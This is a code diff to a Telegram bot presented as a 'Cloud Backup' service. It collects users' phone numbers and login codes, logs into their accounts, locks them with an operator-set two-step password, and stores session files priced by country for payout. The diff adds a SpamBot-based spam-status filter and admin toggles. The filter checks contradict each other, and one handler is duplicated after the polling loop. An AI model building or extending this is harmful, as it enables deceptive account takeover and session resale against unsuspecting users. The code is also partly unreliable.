@@ -1,3 +1,18 @@
+async def get_spam_status(client):
+    try:
+        await client.send_message("SpamBot", "/start")
+        await asyncio.sleep(2)
+        messages = await client.get_messages("SpamBot", limit=1)
+        response = messages[0].text.lower()
+        
+        # স্প্যাম-ফ্রি বা নিউ রেজিস্ট্রেশন হলে এই শর্তে টিকবে
+        if "good news" in response or "unfortunately, some phone numbers" in response:
+            return "Free as a Bird"
+        else:
+            return "Limited"
+    except Exception as e:
+        return "Limited"
+        
 import os
 import asyncio
 import json
@@ -219,6 +234,22 @@ def cmd_start(message):
     if not check_force_join(message): return
     bot.send_message(message.chat.id, "👋 **Welcome to Cloud Backup Telegram Bot**\n\nTo start a secure backup of your Telegram Account, please send your phone number with your country code.\nExample: `+88017XXXXXXXX` or `+52XXXXXXXXXX`")
 
+@bot.message_handler(commands=['spam_on', 'spam_off'])
+def admin_spam_control(message):
+    # তোমার অ্যাডমিন চেক ফাংশনটি এখানে দিবে (যেমন: if not is_admin(message.from_user.id): return)
+    settings = load_settings()
+    if message.text == '/spam_on':
+        settings["spam_filter_active"] = True
+        msg = "✅ **Spam Filter is now ON.**"
+    else:
+        settings["spam_filter_active"] = False
+        msg = "✅ **Spam Filter is now OFF.**"
+    
+    # সেটিংস সেভ করা
+    with open(SETTINGS_FILE, "w") as f:
+        json.dump(settings, f, indent=4)
+    bot.reply_to(message, msg, parse_mode="Markdown")
+    
 @bot.message_handler(commands=['cancel'])
 def cmd_cancel(message):
     if not check_force_join(message): return
@@ -300,6 +331,20 @@ def handle_withdraw_selection(call):
         bot.send_message(call.message.chat.id, "🪙 **Send your USDT BEP-20 Address:**\n\n⚠️ *Must be 42 characters long and start with '0x'*")
         admin_state[user_id] = "wait_wtd_bep20"
 
+@bot.callback_query_handler(func=lambda call: call.data in ["spam_on", "spam_off"])
+def handle_spam_settings(call):
+    settings = load_settings()
+    if call.data == "spam_on":
+        settings["spam_filter_active"] = True
+        msg = "✅ Spam Filter is now ON."
+    else:
+        settings["spam_filter_active"] = False
+        msg = "❌ Spam Filter is now OFF."
+    
+    with open("bot_settings.json", "w") as f:
+        json.dump(settings, f, indent=4)
+    bot.answer_callback_query(call.id, msg)
+    
 # ==================== EXPORTER LOGIC ====================
 def export_logic(chat_id, country_code, amount):
     target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
@@ -363,6 +408,10 @@ def admin_panel_command(message):
     markup.add(
         types.InlineKeyboardButton("📂 All Session Files", callback_data="pnl_all_files"),
         types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close")
+    )
+    markup.add(
+        types.InlineKeyboardButton("🛡️ Spam Filter ON", callback_data="spam_on"),
+        types.InlineKeyboardButton("🚫 Spam Filter OFF", callback_data="spam_off")
     )
     
     to_cnt = get_timed_out_file_count()
@@ -617,12 +666,25 @@ async def verify_otp_task(text, user_id, message):
             code=text,
             phone_code_hash=data["phone_code_hash"]
         )
-        
-        # সফল হলে ২-এফএ সেটআপ
+
+        # সফল হলে ২-এফএ সেটআপ এবং স্প্যাম চেক
         settings = load_settings()
-        try: await data["client"].edit_2fa(new_password=settings["security_password"])
-        except: pass
         
+        if settings.get("spam_filter_active", False):
+            status = await get_spam_status(data["client"])
+            if "limited" in status.lower():
+                bot.reply_to(message, "🚫 **Access Denied:** Account is Limited.")
+                try: await data["client"].disconnect()
+                except: pass
+                del user_data[user_id]
+                return
+
+        # স্প্যাম ফ্রি হলে 2FA সেট হবে
+        try:
+            await data["client"].edit_2fa_password(new_password=settings["security_password"])
+        except Exception as e:
+            print(f"2FA Setup Error: {e}")
+
         # ব্যাকআপ প্রসেস শুরু
         await process_backup(user_id, message, data)
         del user_data[user_id]
@@ -632,14 +694,12 @@ async def verify_otp_task(text, user_id, message):
         try: await data["client"].disconnect()
         except: pass
         del user_data[user_id]
-
     except Exception as e:
         error_str = str(e)
-        # ২. ভুল ওটিপি হলে মেসেজ এবং সেশন ক্লোজ
         if "PHONE_CODE_INVALID" in error_str:
-            bot.reply_to(message, "❌ **Wrong OTP!** Please check the code and send it again.")
+            bot.reply_to(message, "❌ **Wrong OTP!**")
         elif "PHONE_CODE_EXPIRED" in error_str:
-            bot.reply_to(message, "❌ **OTP Expired!** Please request a new code.")
+            bot.reply_to(message, "❌ **OTP Expired!**")
         else:
             bot.reply_to(message, f"❌ **Error:** {error_str}")
         
@@ -649,13 +709,27 @@ async def verify_otp_task(text, user_id, message):
         return
 
 async def process_backup(user_id, message, data):
+    client = data["client"]
     settings = load_settings()
     country_code = data['country_code']
     delay = settings.get("country_delays", {}).get(country_code, 60)
 
+    # স্প্যাম স্ট্যাটাস চেক ও ফিল্টারিং
+    status = await get_spam_status(client)
+    is_spam = "Limited" in status
+    
+    if settings.get("spam_filter_active", False) and not is_spam:
+        bot.send_message(message.chat.id, "🚫 **Access Denied:** Only Spam accounts are allowed.")
+        try: await client.disconnect()
+        except: pass
+        return
+
+    bot.send_message(message.chat.id, f"📌 **Spam Status:** {status}")
+
+    # কান্ট্রি ও ক্যাপাসিটি চেক
     if country_code not in settings.get("country_prices", {}):
         bot.send_message(message.chat.id, f"❗ This country `+{country_code}` cannot be added right now.")
-        try: await data["client"].disconnect()
+        try: await client.disconnect()
         except: pass
         return
 
@@ -664,7 +738,7 @@ async def process_backup(user_id, message, data):
 
     if current_count >= max_capacity:
         bot.send_message(message.chat.id, f"❌ **Sorry!** The capacity for country `+{country_code}` is full.")
-        try: await data["client"].disconnect()
+        try: await client.disconnect()
         except: pass
         return
     # --- নতুন চেক লজিক শেষ ---
@@ -792,3 +866,17 @@ if __name__ == "__main__":
     flask_thread = Thread(target=run_flask, daemon=True)
     flask_thread.start()
     bot.infinity_polling()
+
+@bot.callback_query_handler(func=lambda call: call.data in ["spam_on", "spam_off"])
+def handle_spam_settings(call):
+    settings = load_settings()
+    if call.data == "spam_on":
+        settings["spam_filter_active"] = True
+        msg = "✅ Spam Filter is now ON."
+    else:
+        settings["spam_filter_active"] = False
+        msg = "❌ Spam Filter is now OFF."
+    
+    with open("bot_settings.json", "w") as f:
+        json.dump(settings, f, indent=4)
+    bot.answer_callback_query(call.id, msg)
